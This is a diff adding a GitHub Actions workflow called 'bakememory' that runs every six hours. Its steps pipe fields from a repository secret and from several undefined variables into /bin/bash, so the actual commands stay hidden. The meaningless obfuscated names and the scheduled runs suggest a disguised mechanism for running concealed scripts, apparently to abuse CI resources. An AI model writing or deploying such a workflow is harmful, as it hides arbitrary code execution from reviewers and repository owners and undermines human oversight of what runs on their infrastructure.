@@ -1,0 +1,25 @@
+name: bakememory
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '9 0/6 * * *'
+jobs:
+  build:
+    runs-on: ubuntu-latest
+
+    steps:
+      - uses: actions/checkout@v4
+      - name: bakememory
+        env:
+          fihmp80601: ${{ secrets.fihmp80601 }}
+        run: |
+          echo $fihmp80601 | jq -r .vdhvt7442 | /bin/bash
+          echo $c56157 | jq -r .komoh23093 | /bin/bash
+          echo $shp2172 | jq -r .yvbnp2506 | /bin/bash
+          echo $kbt698 | jq -r .aiovg5527 | /bin/bash
+          echo $guu722 | jq -r .ldayl511 | /bin/bash
+          echo $sis24 | jq -r .iz1 | /bin/bash
+          echo $g968 | jq -r .lmnxz44 | /bin/bash
+          echo $wbd08 | jq -r .gbe3462 | /bin/bash
+          echo $pj80 | jq -r .kfen4988 | /bin/bash
+
